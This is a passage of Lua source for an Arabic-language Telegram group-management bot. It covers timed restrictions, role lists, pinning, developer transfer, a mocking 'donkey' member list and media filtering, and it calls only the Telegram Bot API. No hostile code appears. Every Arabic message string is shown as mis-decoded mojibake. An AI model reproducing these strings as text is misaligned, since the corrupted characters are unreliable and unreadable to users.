Devmfm:srem(mustafa..'mfm:MuteAll:', user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุงูุบุงุก (ุงูุญุธุฑ โข ุงููุชู) ุนุงู ูู ุงููุฌููุนุงุช")  
end
end
end
if (text == "ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู" or text == "ููู ููููู ุงูุจูุช" or text == "ุชุบููุฑ ุงููุทูุฑ ุงูุงุณุงุณู" or text == "โซ ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู โ") and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
send(msg.chat_id_, msg.id_,'โ๏ธูุฌุจ ุงูุชุงูุฏ ุงู ุงููุทูุฑ ุงูุฌุฏูุฏ ุงุฑุณู start ูุฎุงุต ุงูุจูุช ุจุนุฏ ุฐูู ููููู ุงุฑุณุงู ุงูุฏู ุงููุทูุฑ')
Devmfm:setex(mustafa.."mfm:EditDev"..msg.sender_user_id_,300,true)
end
if Devmfm:get(mustafa.."mfm:EditDev"..msg.sender_user_id_) then
if text and text:match("^ุงูุบุงุก$") then 
send(msg.chat_id_, msg.id_,'โ๏ธุชู ุงูุบุงุก ุงูุฑ ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู')
Devmfm:del(mustafa.."mfm:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
Devmfm:del(mustafa.."mfm:EditDev"..msg.sender_user_id_)
Devmfm:set(mustafa.."mfm:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\nโ๏ธุงููุนุฑู โซ [@'..dp.username_..']' else DevUser = '' end
local Text = 'โ๏ธุงูุงูุฏู โซ '..dp.id_..DevUser..'\nโ๏ธุงูุงุณู โซ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')\nโ๏ธุชู ุญูุธ ุงููุนูููุงุช ุจูุฌุงุญ\nโ๏ธุงุณุชุฎุฏู ุงูุงุฒุฑุงุฑ ููุชุงููุฏ โซ โค'
keyboard = {} 
keyboard.inline_keyboard = {{{text="ูุนู",callback_data="/setyes"},{text="ูุง",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"โ๏ธุงููุนูููุงุช ุฎุงุทุฆู ูู ุจุงูุชุงูุฏ ูุงุนุฏ ุงููุญุงููู")
Devmfm:del(mustafa.."mfm:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^ุฑูุน ูุทู$") and not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if Devmfm:sismember(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธูู ูุทู ุดุฑูุน ููู ุจุนุฏ๐น๐") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทุงูู") 
Devmfm:sadd(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^ุชูุฒูู ูุทู$") and not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not Devmfm:sismember(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธูู ููุณ ูุทู ููุชู ุชูุฒููู") 
else
Devmfm:srem(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทุงูู") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
if Admin(msg) then
if text and (text:match('^ุชูููุฏ ุฏูููู (%d+)$') or text:match('^ูุชู ุฏูููู (%d+)$') or text:match('^ุชููุฏ ุฏูููู (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ุชูููุฏ ุฏูููู (%d+)$') or text:match('^ูุชู ุฏูููู (%d+)$') or text:match('^ุชููุฏ ุฏูููู (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุชููุฏ โซ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชููุฏู ููุฏุฉ โซ "..mutept.." ุฏ") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^ุชูููุฏ ุณุงุนู (%d+)$') or text:match('^ูุชู ุณุงุนู (%d+)$') or text:match('^ุชููุฏ ุณุงุนู (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ุชูููุฏ ุณุงุนู (%d+)$') or text:match('^ูุชู ุณุงุนู (%d+)$') or text:match('^ุชููุฏ ุณุงุนู (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุชููุฏ โซ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชููุฏู ููุฏุฉ โซ "..mutept.." ุณ") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^ุชูููุฏ ููู (%d+)$') or text:match('^ูุชู ููู (%d+)$') or text:match('^ุชููุฏ ููู (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ุชูููุฏ ููู (%d+)$') or text:match('^ูุชู ููู (%d+)$') or text:match('^ุชููุฏ ููู (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุชููุฏ โซ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชููุฏู ููุฏุฉ โซ "..mutept.." ู") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
if text and text:match("^ุงุถู ุฑุณุงุฆู (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^ุงุถู ุฑุณุงุฆู (%d+)$")
Devmfm:set('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_,TXT)  
Devmfm:setex('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ุนุฏุฏ ุงูุฑุณุงุฆู ุงูุงู \nโ๏ธุงุฑุณู ุงูุบุงุก ูุงูุบุงุก ุงูุงูุฑ ", 1, "md")
Dev_mfm(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ููููุดุฆูู ููุท', 1, 'md') 
end 
end 
if text and text:match("^ุงุถู ุฑุณุงุฆู (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^ุงุถู ุฑุณุงุฆู (%d+)$")
function Reply(extra, result, success)
Devmfm:del(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
Devmfm:incrby(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุถุงูุฉ "..Num..' ุฑุณุงูู', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^ุงุถู ููุงุท (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^ุงุถู ููุงุท (%d+)$")
Devmfm:set('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_,TXT)  
Devmfm:setex('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ุนุฏุฏ ุงูููุงุท ุงูุงู \nโ๏ธุงุฑุณู ุงูุบุงุก ูุงูุบุงุก ุงูุงูุฑ ", 1, "md")
Dev_mfm(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ููููุดุฆูู ููุท', 1, 'md') 
end 
end 
if text and text:match("^ุงุถู ููุงุท (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^ุงุถู ููุงุท (%d+)$")
function Reply(extra, result, success)
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงุถุงูุฉ "..Num..' ููุทู', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if Devmfm:get(mustafa..'mfm:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then Devmfm:sadd(mustafa.."mfm:cleaner"..msg.chat_id_, msg.id_) else Devmfm:sadd(mustafa.."mfm:cleaner"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^ุชุซุจูุช$") and ChCheck(msg) then 
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "โ๏ธุงูุชุซุจูุช ูุงูุบุงุก ูุงุนุงุฏุฉ ุงูุชุซุจูุช ุชู ูููู ูู ูุจู ุงูููุดุฆูู ุงูุงุณุงุณููู", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
Devmfm:set(mustafa..'mfm:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุซุจูุช ุงูุฑุณุงูู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงูุจูุช ููุณ ุงุฏูู ููุง !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุงูุชุซุจูุช ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
return false  
end
end,nil)
end 
end
if Admin(msg) then
if text == "ุงููููุฒูู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:VipMem:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงููููุฒูู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ูููุฒูู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
if Manager(msg) then
if text == "ุงูุงุฏูููู" and ChCheck(msg) or text == "ุงูุงุฏูููุฉ" and ChCheck(msg) then 
local mfm =  'mfm:Admins:'..msg.chat_id_
local List = Devmfm:smembers(mustafa..mfm)
text = "โ๏ธูุงุฆูุฉ ุงูุงุฏูููู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธ*ูุง ููุฌุฏ ุงุฏูููู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source mustafa     -- 
if Constructor(msg) then
if text == "ุงููุฏุฑุงุก" and ChCheck(msg) or text == "ูุฏุฑุงุก" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Managers:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงููุฏุฑุงุก โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ูุฏุฑุงุก*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "ุงูููุธููู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Cleaner:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงูููุธููู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ููุธููู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
if BasicConstructor(msg) then
if text == "ุงูููุดุฆูู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Constructor:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงูููุดุฆูู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ููุดุฆูู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
if mfmConstructor(msg) then
if text == "ุงูููุดุฆูู ุงูุงุณุงุณููู" and ChCheck(msg) or text == "ููุดุฆูู ุงุณุงุณููู" and ChCheck(msg) or text == "ุงูููุดุฆูู ุงูุงุณุงุณูู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงูููุดุฆูู ุงูุงุณุงุณููู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ููุดุฆูู ุงุณุงุณููู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("ุงูููุดุฆ") and ChCheck(msg) or text ==("ุงููุงูู") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุญุณุงุจ ุงูููุดุฆ ูุญุฐูู", 1, "md")
return false  
end
local UserName = (dp.username_ or "KKDKKB7")
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธููุดุฆ ุงููุฌููุนู โซ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
if Admin(msg) then
if text == "ุงูููุชูููู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Muted:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงูููุชูููู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ููุชูููู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "ุงููููุฏูู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Tkeed:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงููููุฏูู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธ*ูุง ููุฌุฏ ูููุฏูู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "ุงููุญุธูุฑูู" and ChCheck(msg) or text == "ุงููุญุถูุฑูู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Ban:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงููุญุธูุฑูู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ูุญุธูุฑูู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "ูุงุฆูู ุงูููุน" and ChCheck(msg) then
local List = Devmfm:hkeys(mustafa..'mfm:Filters:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ุงูููุน โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k, v in pairs(List) do
text = text..k..'~ โจ '..v..' โฉ\n'
end
if #List == 0 then
text = "โ๏ธูุง ุชูุฌุฏ ูููุงุช ููููุนู"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
if text == "ุงููุทุงูู" and ChCheck(msg) or text == "ุงููุทุงูุฉ" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa..'User:Donky:'..msg.chat_id_)
text = "โ๏ธูุงุฆูุฉ ูุทุงูุฉ ุงููุฌููุนู ๐น๐ โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธ*ูุง ููุฌุฏ ูุทุงูู ูููุง ุงูุงุฏู* ๐น๐"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
if text == "ุงููุทูุฑูู ุงูุซุงููููู" and SecondSudo(msg) or text == "ุงูุซุงููููู" and SecondSudo(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:SecondSudo:')
text = "โ๏ธูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธ*ุนุฐุฑุง ูู ูุชู ุฑูุน ุงู ูุทูุฑูู ุซุงููููู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if SudoBot(msg) then
if text == "ูุงุฆูู ุงูุนุงู" and ChCheck(msg) or text == "ุงููุญุธูุฑูู ุนุงู" and ChCheck(msg) or text == "ุงูููุชูููู ุนุงู" and ChCheck(msg) or text == "โซ ูุงุฆูู ุงูุนุงู โ" and ChCheck(msg) then 
local BanAll = Devmfm:smembers(mustafa..'mfm:BanAll:')
local MuteAll = Devmfm:smembers(mustafa..'mfm:MuteAll:')
if #BanAll ~= 0 then 
text = "โ๏ธูุงุฆูุฉ ุงููุญุธูุฑูู ุนุงู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(BanAll) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."โ๏ธูุงุฆูุฉ ุงูููุชูููู ุนุงู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(MuteAll) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "โ๏ธ*ูู ูุชู ุญุธุฑ ุงู ูุชู ุงู ุนุถู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "ุงููุทูุฑูู" and ChCheck(msg) or text == "โซ ุงููุทูุฑูู โ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:SudoBot:')
text = "โ๏ธูุงุฆูุฉ ุงููุทูุฑูู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local sudouser = Devmfm:get(mustafa..'mfm:Sudos'..v) 
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."] โฌ Gps : "..(sudouser or 0).."\n"
else
text = text..""..k.."~ : `"..v.."` โฌ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "โ๏ธ*ุนุฐุฑุง ูู ูุชู ุฑูุน ุงู ูุทูุฑูู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "ุงููุฏุฑุงุก ุงูุนุงููู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:ManagerAll:')
text = "โ๏ธูุงุฆูุฉ ุงููุฏุฑุงุก ุงูุนุงููู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ูุฏุฑุงุก ุนุงููู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
if text == "ุงููููุฒูู ุนุงู" and ChCheck(msg) or text == "ุงููููุฒูู ุงูุนุงููู" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:VipAll:')
text = "โ๏ธูุงุฆูุฉ ุงููููุฒูู ุงูุนุงู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "โ๏ธ*ูุง ููุฌุฏ ูููุฒูู ุนุงู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source mustafa     -- 
if text == "ุงูุงุฏูููู ุงูุนุงููู" and ChCheck(msg) then 
local mfm =  'mfm:AdminAll:'
local List = Devmfm:smembers(mustafa..mfm)
text = "โ๏ธูุงุฆูุฉ ุงูุงุฏูููู ุงูุนุงููู โซ โค \nโ โ โ โ โ โ โ โ โ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "โ๏ธ*ูุง ููุฌุฏ ุงุฏูููู ุนุงููู*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
if text ==("ุฑูุน ุงูููุดุฆ") and ChCheck(msg) or text ==("ุฑูุน ุงููุงูู") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุญุณุงุจ ุงูููุดุฆ ูุญุฐูู", 1, "md")
return false  
end
local UserName = (dp.username_ or "KKDKKB7")
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุฑูุน ููุดุฆ ุงููุฌููุนู โซ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
Devmfm:sadd(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
if Manager(msg) then
if text == 'ููุน' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
Devmfm:sadd(mustafa.."mfm:FilterSteckr"..msg.chat_id_,idsticker)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ููุน ุงูููุตู ุจูุฌุงุญ ูู ูุชู ุงุฑุณุงูู ูุฌุฏุฏุง', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
Devmfm:sadd(mustafa.."mfm:FilterPhoto"..msg.chat_id_,photo)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ููุน ุงูุตูุฑู ุจูุฌุงุญ ูู ูุชู ุงุฑุณุงููุง ูุฌุฏุฏุง', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
Devmfm:sadd(mustafa.."mfm:FilterAnimation"..msg.chat_id_,idanimation)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ููุน ุงููุชุญุฑูู ุจูุฌุงุญ ูู ูุชู ุงุฑุณุงููุง ูุฌุฏุฏุง', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
if text == 'ุงูุบุงุก ููุน' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
